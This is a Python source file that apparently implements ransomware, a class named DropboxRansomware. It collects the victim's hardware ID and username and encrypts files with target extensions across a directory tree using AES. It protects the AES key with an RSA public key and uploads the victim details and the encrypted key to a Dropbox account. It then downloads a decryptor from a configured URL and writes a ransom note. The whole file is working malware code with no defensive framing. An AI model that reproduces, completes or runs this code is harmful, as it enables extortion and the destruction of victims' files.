import os
import requests
import subprocess
import base64
import dropbox
import json
from time import time
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad


class DropboxRansomware:

    def __init__(self, config: dict):
        # config
        self.config = config
        # misc victim identifying info
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        self._encrypted_file_extension = '.'+str(round(time() * 1000))
        # aes key
        self._aes_key = os.urandom(16)
        self._encrypted_aes_key = None
        # ransom message inserts
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`encrypted_file_extension`': self._encrypted_file_extension,
            '`decryptor_path`': self.config['decryptor_download_filepath'],
            '`init_vector`': self.config['b64_str_init_vector'],
            '`email_address`': self.config['email_address'],
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)

    def _encrypt_file(self, filepath) -> None:
        init_vector: bytes = base64.b64decode(self.config['b64_str_init_vector'].encode())
        aes_cipher = AES.new(self._aes_key, AES.MODE_CBC, init_vector)
        with open(filepath, 'rb') as f:
            file_contents = f.read()
        padded_file_contents = pad(file_contents, AES.block_size)
        encrypted_file_contents = aes_cipher.encrypt(padded_file_contents)
        with open(filepath, 'wb') as f:
            f.write(encrypted_file_contents)
        os.rename(filepath, filepath+self._encrypted_file_extension)

    def _save_ransom_message(self) -> None:
        # drop ransom note
        with open(self.config['ransom_message_filepath'], 'w') as f:
            f.write(self.config['ransom_message'])
    
    def _download_decryptor(self) -> None:
        with open(self.config['decryptor_download_filepath'], 'wb') as f:
            f.write(requests.get(self.config['decryptor_source_url']).content)

    def _exfiltrate_victim_info(self) -> None:
        # exfiltrate HWID, RSA pubkey, and encrypted AES key
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        # RSA pubkey, HWID, encrypted AES key, encrypted AES init vector
        b64_encrypted_aes_key: str = base64.b64encode(self._encrypted_aes_key).decode('utf-8')
        victim_info_contents = json.dumps({
            'hwid': self._victim_hwid,
            'rsa_pubkey': self.config['b64_str_rsa_pubkey'],
            'b64_encoded_encrypted_aes_key': b64_encrypted_aes_key, 
        }, indent=self.config['output_json_indent_level'])
        # save to .json file on dropbox
        output_filename = str(round(time() * 1000)) + '.txt'
        full_dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        dbx.files_upload(victim_info_contents.encode('utf-8'), full_dropbox_filepath)

    def _encrypt_files(self) -> None:
        for root, dirs, files in os.walk(self.config['root_dirpath']):
            full_filepaths = \
                [os.path.join(root, fname) for fname in files if os.path.splitext(fname)[-1].strip() in self.config['target_file_extensions']]
            for filepath in full_filepaths:
                self._encrypt_file(filepath)

    def _encrypt_and_replace_aes_key(self) -> None:
        # encrypt AES key and delete unencrypted AES key
        rsa_key_object = RSA.importKey(base64.b64decode(self.config['b64_str_rsa_pubkey'].encode('utf-8')))
        rsa_cipher = PKCS1_OAEP.new(rsa_key_object)
        self._encrypted_aes_key = rsa_cipher.encrypt(self._aes_key)
        del(self._aes_key)

    def run(self) -> None:
        self._encrypt_files()
        self._encrypt_and_replace_aes_key()
        self._exfiltrate_victim_info()
        self._download_decryptor()
        self._save_ransom_message()
